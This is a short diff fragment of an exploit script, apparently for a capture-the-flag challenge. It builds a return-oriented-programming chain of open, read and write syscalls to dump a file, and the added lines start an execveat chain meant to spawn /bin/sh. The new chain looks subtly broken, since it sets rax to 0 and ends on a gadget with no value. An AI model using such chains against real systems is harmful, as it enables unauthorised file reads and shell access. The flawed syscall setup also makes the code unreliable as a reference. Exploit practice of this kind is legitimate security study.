@@ -13,3 +13,6 @@ Rop+= p64(rax) + p64(0x2) + p64(rdi) + p64(Elf_base + 0x4090) + p64(rsi) + p64(0
 Rop+= p64(rax) + p64(0x0) + p64(rdi) + p64(3) + p64(rsi) + p64(Elf_base + 0x4090) + p64(rdx_rbx) + p64(0x100)*2 + p64(syscall)
 # write
 Rop+= p64(rax) + p64(0x1) + p64(rdi) + p64(1) + p64(rsi) + p64(Elf_base + 0x4090) + p64(rdx_rbx) + p64(0x70)*2 + p64(syscall)
+
+# execveat(0, "/bin/sh", NULL, NULL, 0)
+execveat = p64(rax) + p64(0x0) + p64(rdi) + p64(0x0) + p64(rsi) + p64(sh) + p64(rdx) + p64(0x0) + p64(rcx) + p64(0x0) + p64(r8)
